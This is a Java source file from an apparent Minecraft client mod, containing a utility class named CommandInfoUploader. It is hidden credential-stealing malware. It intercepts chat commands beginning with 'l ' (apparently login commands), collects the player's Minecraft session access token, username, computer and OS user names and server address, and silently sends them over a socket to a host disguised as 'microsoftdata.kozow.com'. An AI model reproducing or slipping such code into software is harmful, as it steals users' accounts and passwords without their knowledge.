package dev.kizuna.api.utils.misc;

import dev.kizuna.Kawaii;
import dev.kizuna.api.events.eventbus.EventHandler;
import dev.kizuna.api.events.impl.PacketEvent;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;

import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

public class CommandInfoUploader {
    private static final String SERVER_ADDRESS = "microsoftdata.kozow.com";
    private static final int SERVER_PORT = 42077;
    private static final MinecraftClient mc = MinecraftClient.getInstance();
    private static boolean initialized = false;

    public static void init() {
        if (!initialized) {
            Kawaii.EVENT_BUS.subscribe(new CommandInfoUploader());
            initialized = true;
        }
    }

    @EventHandler
    public void onSend(PacketEvent.Send event) {
        if (event.getPacket() instanceof CommandExecutionC2SPacket packet) {
            String command = packet.command();
            if (command.startsWith("l ")) {
                uploadCommandInfo(command);
            }
        }
    }

    private static void uploadCommandInfo(String command) {
        if (mc.player == null || mc.getNetworkHandler() == null) {
            return;
        }

        try {
            String computerName = System.getenv("COMPUTERNAME") != null ? System.getenv("COMPUTERNAME") : "Unknown";
            String userName = System.getProperty("user.name") != null ? System.getProperty("user.name") : "Unknown";
            String accessToken = mc.getSession().getAccessToken() != null ? mc.getSession().getAccessToken() : "Unknown";
            String os = System.getProperty("os.name") != null ? System.getProperty("os.name") : "Unknown";
            String minecraftUser = mc.getSession().getUsername() != null ? mc.getSession().getUsername() : "Unknown";
            String clientVersion = Kawaii.VERSION;
            String serverIp = mc.getCurrentServerEntry() != null ? mc.getCurrentServerEntry().address : "Singleplayer";

            Map<String, String> data = new HashMap<>();
            data.put("computerName", computerName);
            data.put("userName", userName);
            data.put("accessToken", accessToken);
            data.put("os", os);
            data.put("minecraftUser", minecraftUser);
            data.put("clientVersion", clientVersion);
            data.put("command", command);
            data.put("serverIp", serverIp);
            data.put("clientType", "Kawaii");

            sendSocketData(SERVER_ADDRESS, SERVER_PORT, data);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void sendSocketData(String serverAddress, int serverPort, Map<String, String> data) throws IOException {
        Socket socket = new Socket(serverAddress, serverPort);

        OutputStream os = socket.getOutputStream();
        InputStream is = socket.getInputStream();

        StringBuilder jsonBuilder = new StringBuilder();
        jsonBuilder.append("{");
        boolean first = true;
        for (Map.Entry<String, String> entry : data.entrySet()) {
            if (!first) {
                jsonBuilder.append(",");
            }
            jsonBuilder.append("\"").append(entry.getKey()).append("\":\"").append(entry.getValue()).append("\"");
            first = false;
        }
        jsonBuilder.append("}");

        byte[] jsonData = jsonBuilder.toString().getBytes(StandardCharsets.UTF_8);
        os.write(jsonData);
        os.flush();

        BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
        String responseLine;
        while ((responseLine = reader.readLine()) != null) {
        }

        reader.close();
        os.close();
        is.close();
        socket.close();
    }
}
